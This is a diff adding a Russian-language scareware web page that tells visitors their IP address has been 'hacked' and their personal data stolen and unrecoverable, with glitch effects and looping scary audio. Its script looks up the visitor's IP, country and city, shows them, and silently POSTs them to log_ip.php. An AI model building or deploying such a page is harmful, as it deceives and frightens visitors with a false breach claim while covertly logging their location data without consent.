@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="mailer.php">
+    <title>WARNING!</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: "Courier New", Courier, monospace;
+            text-align: center;
+            margin-top: 20%;
+            animation: glitch 1s infinite;
+        }
+        h1 {
+            font-size: 30px;
+            text-shadow: 0 0 5px rgb(255, 0, 0), 0 0 10px rgb(56, 0, 0);
+        }
+
+        h2 {
+            font-size: 30px;
+            text-shadow: 0 0 5px rgb(255, 0, 0), 0 0 10px rgb(88, 0, 0)
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px red; }
+            25% { text-shadow: -2px -2px darkred; }
+            27% { text-shadow: -2px -2px darkred; }
+            50% { text-shadow: 2px -2px red; }
+            60% { text-shadow: 2px -2px red; }
+            75% { text-shadow: -2px 2px darkred; }
+            90% { text-shadow: -2px 2px darkred; }
+            100% { text-shadow: 2px 2px red; }
+        }
+        .warning {
+            font-size: 18px;
+            color: white;
+            margin-top: 20px;
+            animation: flicker 1.5s infinite alternate;
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+    </style>
+    <script>
+        // Воспроизведение пугающей музыки
+        window.onload = function() {
+            let audio = new Audio('scary.mp3');
+            audio.loop = true;
+            audio.play().catch(error => console.log("Автовоспроизведение заблокировано"));
+        };
+        
+        // Получение IP и другой информации
+        fetch('https://api.db-ip.com/v2/free/self')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('user-info').innerHTML = `Ваш IP: ${data.ipAddress}<br>Страна: ${data.countryName}<br>Город: ${data.city}`;
+                fetch('log_ip.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            });
+    </script>
+</head>
+<body>
+    <h1>⚠ ВАШ IP АДРЕС ВЗЛОМАН ⚠</h1>
+    <h2>И ЕЩЕ КУЧУ ДАННЫХ ВАШИХ</h2>
+    <p class="warning">Вся ваша личная информация была загружена в базу данных.</p>
+    <p id="user-info" class="warning"></p>
+    <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
+    <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
+    <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
+    <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
+</body>
+</html>
